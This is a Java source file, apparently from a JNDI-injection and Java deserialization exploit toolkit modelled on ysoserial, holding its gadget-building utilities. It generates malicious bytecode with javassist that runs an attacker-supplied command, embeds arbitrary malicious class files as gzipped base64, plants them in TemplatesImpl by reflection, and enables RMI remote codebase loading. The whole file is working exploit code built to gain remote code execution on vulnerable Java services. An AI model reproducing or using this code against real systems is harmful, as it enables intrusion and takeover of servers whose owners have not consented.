package com.nu1r.jndi.gadgets.utils;

import com.nu1r.jndi.template.DnslogTemplate;
import com.nu1r.jndi.template.ReverseShellTemplate;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.template.CommandTemplate;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.wicket.util.file.Files;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

import static com.nu1r.jndi.gadgets.Config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
import static com.nu1r.jndi.gadgets.utils.InjShell.insertCMD;
import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({
        "restriction", "rawtypes", "unchecked"
})
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl(PayloadType type, String... param) throws Exception {
        String command = param[0];

        Class<?> clazz;
        Class    tplClass;
        Class    abstTranslet;
        Class    transFactory;

        // 兼容不同 JDK 版本
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            tplClass = TemplatesImpl.class;
            abstTranslet = AbstractTranslet.class;
            transFactory = TransformerFactoryImpl.class;
        }

        if (command.startsWith("LF#")) {
            command = command.substring(3);
            byte[] bs        = Files.readBytes(new File(command.split("[#]")[0]));
            String className = command.split("[#]")[1];
            return createTemplatesImpl(null, bs, className, tplClass, abstTranslet, transFactory);
        } else {
            // 否则就是普通的命令执行
            return createTemplatesImpl(command, null, null, tplClass, abstTranslet, transFactory);
        }
    }

    public static <T> T createTemplatesImpl(final String command, byte[] bytes, String cName, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T   templates  = tplClass.newInstance();
        byte[]    classBytes = new byte[0];
        ClassPool pool       = ClassPool.getDefault();
        String    newClassName = generateClassName();

        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass superClass = pool.get(abstTranslet.getName());

        CtClass ctClass = null;

        // 如果 Command 不为空，则是普通的命令执行
        if (command != null) {
            ctClass = pool.makeClass(newClassName);
            insertCMD(ctClass);
            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
            ctConstructor.setBody("{execCmd(\"" + command + "\");}");
            ctClass.addConstructor(ctConstructor);

            // 最短化
//			ctClass = pool.makeClass(newClassName);
//			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
//			ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
//			ctClass.addConstructor(ctConstructor);

            // 如果全局配置继承，再设置父类
            if (IS_INHERIT_ABSTRACT_TRANSLET) {
                ctClass.setSuperclass(superClass);
            }

            classBytes = ctClass.toBytecode();
        }

        // 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
        classBytes[7] = 49;

        // 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
        if (bytes != null) {
            ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
            ctClass.setName(generateClassName());
            ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
            GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write(bytes);
            gzipOutputStream.close();
            String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
            String className = "className=\"" + cName + "\";";
            ctClass.makeClassInitializer().insertBefore(content);
            ctClass.makeClassInitializer().insertBefore(className);

            if (IS_INHERIT_ABSTRACT_TRANSLET) {
                ctClass.setSuperclass(superClass);
            }

            classBytes = ctClass.toBytecode();

        }

        // 是否继承恶意类 AbstractTranslet
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            // 将类字节注入实例
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        } else {
            CtClass newClass = pool.makeClass(generateClassName());
            insertField(newClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");

            Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
            // 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
            Reflections.setFieldValue(templates, "_transletIndex", 0);
        }


        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField ctSUID = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(ctSUID);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }
}

